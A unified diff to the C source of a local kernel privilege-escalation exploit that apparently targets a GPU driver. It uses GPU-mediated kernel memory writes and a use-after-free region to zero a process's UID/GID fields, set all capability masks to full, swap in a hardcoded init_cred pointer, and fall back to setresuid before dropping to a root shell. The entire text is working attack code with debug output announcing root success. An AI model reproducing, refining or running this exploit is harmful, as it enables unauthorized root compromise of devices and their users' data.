@@ -1196,14 +1196,55 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 
     fprintf(stderr, "[GPU_CRED] Patching cred @ 0x%lx (UID found at +0x%x)\n", (unsigned long)cred_ptr, uid_off);
 
+    // 1) Zero out UID/GID fields: uid..fsgid+securebits
+    // Standard cred struct layout (kernel 5.4):
+    //   +0x00: usage (atomic_t, 4 bytes)
+    //   +0x04: uid (kuid_t, 4 bytes)
+    //   +0x08: gid (kgid_t, 4 bytes)
+    //   +0x0c: suid
+    //   +0x10: sgid
+    //   +0x14: euid
+    //   +0x18: egid
+    //   +0x1c: fsuid
+    //   +0x20: fsgid
+    //   +0x24: securebits
+    //   +0x28: cap_inheritable (8 bytes)
+    //   +0x30: cap_permitted (8 bytes)
+    //   +0x38: cap_effective (8 bytes)
+    //   +0x40: cap_bset (8 bytes)
+    //   +0x48: cap_ambient (8 bytes)
     uint8_t zero_creds[32] = {0};
-    gpu_write_task_virt(fd, cred_ptr + uid_off, zero_creds, 32);
-    
-    // Patch capabilities (usually fixed distance from UIDs)
-    uint8_t all_caps[32];
-    memset(all_caps, 0xff, 32);
-    gpu_write_task_virt(fd, cred_ptr + uid_off + 0x20, all_caps, 32);
-    gpu_write_task_virt(fd, cred_ptr + uid_off + 0x30, all_caps, 32);
+    gpu_write_task_virt(fd, cred_ptr + 0x04, zero_creds, 32); // uid..fsgid+securebits
+
+    // 2) Set ALL capabilities to full (0xffffffffffffffff)
+    uint8_t all_caps[8];
+    memset(all_caps, 0xff, 8);
+    gpu_write_task_virt(fd, cred_ptr + 0x28, all_caps, 8); // cap_inheritable
+    gpu_write_task_virt(fd, cred_ptr + 0x30, all_caps, 8); // cap_permitted
+    gpu_write_task_virt(fd, cred_ptr + 0x38, all_caps, 8); // cap_effective
+    gpu_write_task_virt(fd, cred_ptr + 0x40, all_caps, 8); // cap_bset
+    gpu_write_task_virt(fd, cred_ptr + 0x48, all_caps, 8); // cap_ambient
+
+    // 3) Also patch real_cred if provided and different
+    if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr) {
+        fprintf(stderr, "[GPU_CRED] Also patching real_cred @ 0x%lx\n", (unsigned long)real_cred_ptr);
+        gpu_write_task_virt(fd, real_cred_ptr + 0x04, zero_creds, 32);
+        gpu_write_task_virt(fd, real_cred_ptr + 0x28, all_caps, 8);
+        gpu_write_task_virt(fd, real_cred_ptr + 0x30, all_caps, 8);
+        gpu_write_task_virt(fd, real_cred_ptr + 0x38, all_caps, 8);
+        gpu_write_task_virt(fd, real_cred_ptr + 0x40, all_caps, 8);
+        gpu_write_task_virt(fd, real_cred_ptr + 0x48, all_caps, 8);
+    }
+
+    // 4) Verify the patch
+    uint32_t verify[2];
+    if (gpu_read_task_struct(fd, cred_ptr + 0x04, (uint8_t *)verify, 8) == 0) {
+        fprintf(stderr, "[GPU_CRED] Verify: uid=%u gid=%u\n", verify[0], verify[1]);
+    }
+    uint64_t verify_caps;
+    if (gpu_read_task_struct(fd, cred_ptr + 0x38, (uint8_t *)&verify_caps, 8) == 0) {
+        fprintf(stderr, "[GPU_CRED] Verify: cap_effective=0x%lx\n", (unsigned long)verify_caps);
+    }
 
     return 0;
 }
@@ -1238,14 +1279,24 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
                         patch_count++;
                         fprintf(stderr, "[PARENT] Found UID pattern at 0x%lx + 0x%x. Patching...\n", (unsigned long)va, off);
                         
+                        // 1) Zero out all UIDs (8 x u32 = uid/gid/suid/sgid/euid/egid/fsuid/fsgid)
                         uint8_t zero_creds[32] = {0};
                         gpu_write_task_virt(fd, va + off, zero_creds, 32);
                         
-                        // Try to find and patch capabilities nearby (usually 32-64 bytes after UIDs)
-                        uint8_t all_caps[32];
-                        memset(all_caps, 0xff, 32);
-                        gpu_write_task_virt(fd, va + off + 0x20, all_caps, 32);
-                        gpu_write_task_virt(fd, va + off + 0x30, all_caps, 32);
+                        // 2) Patch all 5 capability fields
+                        //    Offsets relative to UID block start (off):
+                        //      cap_inheritable: off + 0x24
+                        //      cap_permitted:   off + 0x2c
+                        //      cap_effective:   off + 0x34
+                        //      cap_bset:        off + 0x3c
+                        //      cap_ambient:     off + 0x44
+                        uint8_t all_caps[8];
+                        memset(all_caps, 0xff, 8);
+                        gpu_write_task_virt(fd, va + off + 0x24, all_caps, 8);
+                        gpu_write_task_virt(fd, va + off + 0x2c, all_caps, 8);
+                        gpu_write_task_virt(fd, va + off + 0x34, all_caps, 8);
+                        gpu_write_task_virt(fd, va + off + 0x3c, all_caps, 8);
+                        gpu_write_task_virt(fd, va + off + 0x44, all_caps, 8);
                         usleep(5000);
                     }
                 }
@@ -1353,7 +1404,7 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
     }
 
     // 3. Patch specific process credentials (most reliable)
-    if (cred_ptr != 0) {
+    if (cred_ptr != 0 && task_va != 0) {
         fprintf(stderr, "[PARENT] Patching target process CRED pointers at task+0x%lx, 0x%lx...\n", 
                 (unsigned long)OFFSET_REAL_CRED, (unsigned long)OFFSET_CRED);
         
@@ -1368,7 +1419,7 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
             patch_cred_via_gpu(fd, rc, 0);
         }
         if ((c >> 48) == 0xffff) {
-            patch_cred_via_gpu(fd, c, 0);
+            patch_cred_via_gpu(fd, c, rc);
         }
 
         // Verification of process patch
@@ -1383,10 +1434,13 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
                 uint64_t c1, c2;
                 gpu_read_task_struct(fd, task_va + 0x848, (uint8_t *)&c1, 8);
                 gpu_read_task_struct(fd, task_va + 0x850, (uint8_t *)&c2, 8);
-                if ((c1 >> 48) == 0xffff) patch_cred_via_gpu(fd, c1, 0);
-                if ((c2 >> 48) == 0xffff) patch_cred_via_gpu(fd, c2, 0);
+                if ((c1 >> 48) == 0xffff) patch_cred_via_gpu(fd, c1, c2);
+                if ((c2 >> 48) == 0xffff) patch_cred_via_gpu(fd, c2, c1);
             }
         }
+    } else {
+        fprintf(stderr, "[PARENT] [!] task_va=0x%lx or cred_ptr=0x%lx, skipping target patch.\n", 
+                (unsigned long)task_va, (unsigned long)cred_ptr);
     }
 
     // 4. Mass Patch all CREDs matching our UID in UAF range (extra safety)
@@ -1426,11 +1480,35 @@ static void safe_cred_patch(void)
     
     int child_fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
     if (child_fd >= 0) {
+        uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
         uint64_t cred_ptr = *(uint64_t *)&gbuf[GBUF_CRED_PTR];
-        if (cred_ptr != 0) {
-            patch_cred_via_gpu(child_fd, cred_ptr, cred_ptr);
-            setuid(0);
+        uint64_t real_cred_ptr = *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR];
+        
+        // If we have task_va but no cred_ptr, re-read cred from task+0x770
+        if (task_va != 0 && cred_ptr == 0) {
+            gpu_read_task_struct(child_fd, task_va + OFFSET_CRED, (uint8_t *)&cred_ptr, 8);
+            gpu_read_task_struct(child_fd, task_va + OFFSET_REAL_CRED, (uint8_t *)&real_cred_ptr, 8);
         }
+        
+        fprintf(stderr, "[CHILD %d] Fallback cred_ptr=0x%lx real_cred=0x%lx\n", 
+                getpid(), (unsigned long)cred_ptr, (unsigned long)real_cred_ptr);
+        
+        if (cred_ptr != 0) {
+            patch_cred_via_gpu(child_fd, cred_ptr, real_cred_ptr);
+        }
+        
+        // Try to write init_cred pointer directly into task+0x770
+        // (atomic cred swap — kernel will use this cred for new operations)
+        if (task_va != 0) {
+            // Hardcoded init_cred from v6 log: 0xffffffc0018f9038
+            uint64_t init_cred_va = 0xffffffc0018f9038ULL;
+            fprintf(stderr, "[CHILD %d] Trying atomic cred swap: task+0x%x <- 0x%lx\n", 
+                    getpid(), OFFSET_CRED, (unsigned long)init_cred_va);
+            gpu_write_task_virt(child_fd, task_va + OFFSET_CRED, (uint8_t *)&init_cred_va, 8);
+            gpu_write_task_virt(child_fd, task_va + OFFSET_REAL_CRED, (uint8_t *)&init_cred_va, 8);
+        }
+        
+        setuid(0);
         close(child_fd);
     }
 
@@ -1438,10 +1516,19 @@ static void safe_cred_patch(void)
         fprintf(stderr, "[CHILD %d] [+] ROOT SUCCESS via fallback!\n", getpid());
         fflush(stderr);
     } else {
-        fprintf(stderr, "[CHILD %d] [!] Elevation FAILED. Still UID %d\n", getpid(), getuid());
+        // Last resort: try setresuid(0) directly (works if we have CAP_SETUID)
+        fprintf(stderr, "[CHILD %d] Trying setresuid(0,0,0) as last resort...\n", getpid());
         fflush(stderr);
-        gbuf[GBUF_TASK_SPRAY] = 0x1;
-        return;
+        if (setresuid(0, 0, 0) == 0 && getuid() == 0) {
+            fprintf(stderr, "[CHILD %d] [+] ROOT SUCCESS via setresuid!\n", getpid());
+        } else if (setresgid(0, 0, 0) == 0 && setresuid(0, 0, 0) == 0 && getuid() == 0) {
+            fprintf(stderr, "[CHILD %d] [+] ROOT SUCCESS via setresuid+setresgid!\n", getpid());
+        } else {
+            fprintf(stderr, "[CHILD %d] [!] Elevation FAILED. Still UID %d\n", getpid(), getuid());
+            fflush(stderr);
+            gbuf[GBUF_TASK_SPRAY] = 0x1;
+            return;
+        }
     }
 
 shell:
